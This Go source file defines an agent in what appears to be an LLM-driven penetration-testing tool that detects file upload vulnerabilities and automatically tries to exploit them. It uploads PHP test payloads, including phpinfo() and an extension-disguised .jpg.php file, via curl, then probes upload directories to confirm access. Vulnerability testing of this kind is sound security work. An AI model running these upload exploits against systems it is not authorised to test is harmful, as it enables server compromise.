package specialist

import (
	"cal-project/internal/brain/llm"
	"cal-project/internal/brain/prompts"
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/core/reporter"
	"cal-project/internal/hands/tools"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"runtime/debug"
	"strings"
	"sync/atomic"
	"time"
)

var fileUploadMessageCounter atomic.Uint64

// FileUploadSpecialist is a specialist agent focused on File Upload vulnerability detection
type FileUploadSpecialist struct {
	id       string
	bus      bus.Bus
	brain    llm.LLM
	ctx      context.Context
	target   string
	executor tools.ToolExecutor
}

// NewFileUploadSpecialist creates a new FileUploadSpecialist agent
func NewFileUploadSpecialist(ctx context.Context, id string, eventBus bus.Bus, llmClient llm.LLM, target string, executor tools.ToolExecutor) *FileUploadSpecialist {
	return &FileUploadSpecialist{
		id:       id,
		bus:      eventBus,
		brain:    llmClient,
		ctx:      ctx,
		target:   target,
		executor: executor,
	}
}

func (f *FileUploadSpecialist) ID() string {
	return f.id
}

func (f *FileUploadSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (f *FileUploadSpecialist) Run() error {
	log.Printf("[%s] Online. Hunting for File Upload vulnerabilities on: %s\n", f.id, f.target)
	return nil
}

func (f *FileUploadSpecialist) OnEvent(event bus.Event) {
	// Only process commands directed to this agent
	if event.Type == bus.Command && event.ToAgent == f.id {
		log.Printf("[%s] Received command: %v\n", f.id, event.Payload)
		go func() {
			defer func() {
				if rec := recover(); rec != nil {
					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", f.id, rec, debug.Stack())
					f.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
				}
			}()
			f.executeTask(event)
		}()
	}
}

// executeTask performs File Upload vulnerability scanning
func (f *FileUploadSpecialist) executeTask(cmdEvent bus.Event) {
	taskDesc, ok := cmdEvent.Payload.(string)
	if !ok {
		log.Printf("[%s] Invalid task payload\n", f.id)
		return
	}

	log.Printf("[%s] Executing: %s\n", f.id, taskDesc)

	if f.executor == nil {
		f.reportObservation(cmdEvent.FromAgent, "File Upload scan skipped (Docker executor unavailable)")
		return
	}

	// Fetch HTTP response
	targetURL := f.replaceLocalhostForDocker(f.target)

	log.Printf("[%s] Fetching HTTP response from: %s\n", f.id, targetURL)
	httpOutput, err := tools.SimpleHTTPGet(f.ctx, f.executor, targetURL)
	if err != nil {
		log.Printf("[%s] HTTP request failed: %v\n", f.id, err)
		f.reportError(cmdEvent.FromAgent, err)
		return
	}

	// Use LLM to analyze for File Upload vulnerabilities
	log.Printf("[%s] Analyzing for File Upload vulnerabilities...\n", f.id)
	analysis := f.analyzeForFileUpload(httpOutput)

	log.Printf("[%s] File Upload analysis complete\n", f.id)

	// Report candidate to Reporter if found
	f.reportCandidateIfFound(analysis)

	// Generate report
	report := f.generateReport(httpOutput, analysis)

	f.reportObservation(cmdEvent.FromAgent, report)
}

func (f *FileUploadSpecialist) replaceLocalhostForDocker(targetURL string) string {
	if strings.Contains(targetURL, "localhost") || strings.Contains(targetURL, "127.0.0.1") {
		if parsedURL, err := url.Parse(targetURL); err == nil {
			hostname := parsedURL.Hostname()
			if hostname == "localhost" || hostname == "127.0.0.1" {
				parsedURL.Host = strings.Replace(parsedURL.Host, hostname, "host.docker.internal", 1)
				return parsedURL.String()
			}
		}
	}
	return targetURL
}

func (f *FileUploadSpecialist) analyzeForFileUpload(httpResponse string) string {
	// Limit response size for LLM
	responseToAnalyze := httpResponse
	if len(httpResponse) > 4000 {
		responseToAnalyze = httpResponse[:4000]
	}

	prompt := prompts.GetFileUploadAnalysis(responseToAnalyze)

	analysis, err := f.brain.Generate(f.ctx, prompt)
	if err != nil {
		log.Printf("[%s] LLM analysis failed: %v\n", f.id, err)
		return "❌ Unable to analyze (LLM error)"
	}

	return analysis
}

// reportCandidateIfFound parses LLM analysis and reports vulnerability candidate to Reporter
func (f *FileUploadSpecialist) reportCandidateIfFound(analysis string) {
	// Check if vulnerability was found
	if !strings.Contains(analysis, "VULNERABILITY CANDIDATE FOUND: Yes") {
		return
	}

	// Extract details from the analysis
	var location, parameter, reasoning, uploadEndpoint string

	lines := strings.Split(analysis, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "- LOCATION:") {
			location = strings.TrimSpace(strings.TrimPrefix(line, "- LOCATION:"))
		} else if strings.HasPrefix(line, "- FILE INPUT NAME:") {
			parameter = strings.TrimSpace(strings.TrimPrefix(line, "- FILE INPUT NAME:"))
		} else if strings.HasPrefix(line, "- REASONING:") {
			reasoning = strings.TrimSpace(strings.TrimPrefix(line, "- REASONING:"))
		} else if strings.HasPrefix(line, "- UPLOAD ENDPOINT:") {
			uploadEndpoint = strings.TrimSpace(strings.TrimPrefix(line, "- UPLOAD ENDPOINT:"))
		}
	}

	// Build full URL if location is relative
	fullURL := f.target
	if location != "" && !strings.HasPrefix(location, "http") {
		if strings.HasPrefix(location, "/") {
			// Parse base URL
			if parsedURL, err := url.Parse(f.target); err == nil {
				fullURL = fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, location)
			}
		}
	} else if location != "" {
		fullURL = location
	}

	// Use upload endpoint if available
	if uploadEndpoint != "" && !strings.HasPrefix(uploadEndpoint, "http") {
		if parsedURL, err := url.Parse(f.target); err == nil {
			baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
			if strings.HasPrefix(uploadEndpoint, "/") {
				fullURL = baseURL + uploadEndpoint
			} else {
				fullURL = baseURL + "/" + uploadEndpoint
			}
		}
	}

	// Attempt exploitation before reporting
	if parameter != "" && fullURL != "" {
		log.Printf("[%s] Attempting File Upload exploitation on endpoint: %s\n", f.id, fullURL)
		if success, evidence := f.exploitFileUpload(fullURL, parameter); success {
			// Exploitation successful - report as Finding (verified)
			f.reportFinding(fullURL, parameter, evidence)
			return
		}
	}

	// Exploitation failed - report as Candidate (unverified)
	candidate := reporter.VulnerabilityCandidate{
		Type:      "FileUpload",
		URL:       fullURL,
		Parameter: parameter,
		Evidence:  analysis,
		Reasoning: reasoning,
		Timestamp: time.Now().Format(time.RFC1123),
		Status:    "pending",
	}

	// Send to Reporter
	candidateJSON, _ := json.Marshal(candidate)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-candidate-%d", f.id, fileUploadMessageCounter.Add(1)),
		FromAgent: f.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Candidate,
		Payload:   string(candidateJSON),
	}
	f.bus.Publish("Reporter-01", event)
}

// exploitFileUpload attempts to exploit File Upload vulnerability
func (f *FileUploadSpecialist) exploitFileUpload(targetURL, parameter string) (bool, string) {
	// Test files to upload (from innocent to malicious)
	type uploadTest struct {
		filename    string
		content     string
		contentType string
		extension   string
	}

	tests := []uploadTest{
		// Innocent test file
		{
			filename:    "test.txt",
			content:     "CAI_TEST_FILE_UPLOAD_VERIFICATION",
			contentType: "text/plain",
			extension:   ".txt",
		},
		// PHP web shell (for verification purposes)
		{
			filename:    "test.php",
			content:     "<?php echo 'CAI_PHP_UPLOAD_SUCCESS'; phpinfo(); ?>",
			contentType: "application/x-php",
			extension:   ".php",
		},
		// PHP disguised as image
		{
			filename:    "test.jpg.php",
			content:     "<?php echo 'CAI_PHP_DISGUISED'; ?>",
			contentType: "image/jpeg",
			extension:   ".jpg.php",
		},
		// PHTML alternative
		{
			filename:    "test.phtml",
			content:     "<?php echo 'CAI_PHTML_SUCCESS'; ?>",
			contentType: "text/html",
			extension:   ".phtml",
		},
	}

	dockerURL := f.replaceLocalhostForDocker(targetURL)

	for _, test := range tests {
		log.Printf("[%s] Testing upload: %s\n", f.id, test.filename)

		// Create multipart upload using curl
		curlCmd := fmt.Sprintf(
			`curl -s -X POST -F "%s=@/dev/stdin;filename=%s;type=%s" "%s"`,
			parameter,
			test.filename,
			test.contentType,
			dockerURL,
		)

		// Execute curl with file content piped to stdin
		uploadCmd := fmt.Sprintf(`echo '%s' | %s`, test.content, curlCmd)

		// Run the upload attempt using RunTool with curl Docker image
		response, err := f.executor.RunTool(f.ctx, "curlimages/curl:latest", []string{"/bin/sh", "-c", uploadCmd})
		if err != nil {
			log.Printf("[%s] Upload attempt failed: %v\n", f.id, err)
			continue
		}

		// Check response for success indicators
		successIndicators := []string{
			"upload",
			"success",
			"file saved",
			"uploaded successfully",
			test.filename,
			"CAI_",
		}

		responseL := strings.ToLower(response)
		for _, indicator := range successIndicators {
			if strings.Contains(responseL, strings.ToLower(indicator)) {
				// Truncate response to 200 chars if needed
				responsePreview := response
				if len(response) > 200 {
					responsePreview = response[:200]
				}

				evidence := fmt.Sprintf(
					"File upload successful. Uploaded file: %s (%s). Server response indicates success: %s",
					test.filename,
					test.extension,
					responsePreview,
				)
				log.Printf("[%s] ✅ FILE UPLOAD VERIFIED: %s\n", f.id, evidence)

				// Try to verify by accessing the uploaded file
				if f.verifyUploadedFile(dockerURL, test.filename, test.content) {
					evidence += " | File access confirmed - uploaded file is accessible."
				}

				return true, evidence
			}
		}
	}

	log.Printf("[%s] ❌ File Upload exploitation failed: No successful uploads detected\n", f.id)
	return false, ""
}

// verifyUploadedFile attempts to access the uploaded file to confirm upload
func (f *FileUploadSpecialist) verifyUploadedFile(baseURL, filename, expectedContent string) bool {
	// Common upload directories
	uploadPaths := []string{
		"/uploads/",
		"/upload/",
		"/files/",
		"/media/",
		"/images/",
		"/",
	}

	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return false
	}

	baseDir := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	for _, uploadPath := range uploadPaths {
		testURL := baseDir + uploadPath + filename

		response, err := tools.SimpleHTTPGet(f.ctx, f.executor, testURL)
		if err != nil {
			continue
		}

		// Check if our content is in the response
		if strings.Contains(response, "CAI_") || strings.Contains(response, expectedContent) {
			log.Printf("[%s] ✅ Uploaded file accessible at: %s\n", f.id, testURL)
			return true
		}
	}

	return false
}

// reportFinding reports a verified File Upload vulnerability
func (f *FileUploadSpecialist) reportFinding(targetURL, parameter, evidence string) {
	finding := reporter.VulnerabilityFinding{
		Type:        "FileUpload",
		Severity:    "Critical",
		URL:         targetURL,
		Payload:     parameter,
		Description: fmt.Sprintf("File Upload vulnerability verified on parameter '%s'. %s. Recommendation: Implement file type validation, use allow-lists for extensions, store uploads outside webroot, randomize filenames, and scan uploaded files for malware.", parameter, evidence),
		Timestamp:   time.Now().Format(time.RFC1123),
	}

	findingJSON, _ := json.Marshal(finding)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-finding-%d", f.id, fileUploadMessageCounter.Add(1)),
		FromAgent: f.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Finding,
		Payload:   string(findingJSON),
	}
	f.bus.Publish("Reporter-01", event)
	log.Printf("[%s] 🎯 Reported verified File Upload finding: %s (param: %s)\n", f.id, targetURL, parameter)
}

func (f *FileUploadSpecialist) generateReport(httpResponse string, analysis string) string {
	report := "=== FILE UPLOAD VULNERABILITY SCAN REPORT ===\n\n"
	report += fmt.Sprintf("Target: %s\n\n", f.target)

	// File Upload Analysis
	report += "\n--- File Upload Vulnerability Analysis ---\n"
	report += analysis + "\n"

	return report
}

func (f *FileUploadSpecialist) reportObservation(toAgent string, observation string) {
	msgID := fileUploadMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-obs-%d", f.id, msgID),
		FromAgent: f.id,
		ToAgent:   toAgent,
		Type:      bus.Observation,
		Payload:   observation,
	}
	f.bus.Publish(toAgent, event)
}

func (f *FileUploadSpecialist) reportError(toAgent string, err error) {
	msgID := fileUploadMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-err-%d", f.id, msgID),
		FromAgent: f.id,
		ToAgent:   toAgent,
		Type:      bus.Error,
		Payload:   err.Error(),
	}
	f.bus.Publish(toAgent, event)
}
